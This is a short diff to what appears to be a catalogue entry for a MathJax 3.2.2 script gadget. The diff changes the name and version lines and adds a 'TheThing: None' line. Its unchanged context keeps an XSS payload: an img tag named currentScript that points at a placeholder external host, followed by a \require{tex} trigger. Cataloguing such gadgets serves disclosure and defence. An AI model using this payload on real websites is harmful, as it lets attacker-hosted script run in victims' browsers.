@@ -2,14 +2,15 @@
 
 ### Meta
 
-+ Library: MathJax
++ Library: MathJax3
 + Stars: 10.1K
-+ Version: 3.2.2
++ Version: v3.2.2
 + Fingerprint: `MathJax.version == "3.2.2"`
 + Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$```
 + Impact: XSS
 + CVE: N/A
 + Foundby: TheHulk
++ TheThing: None
 
 
 ### Library
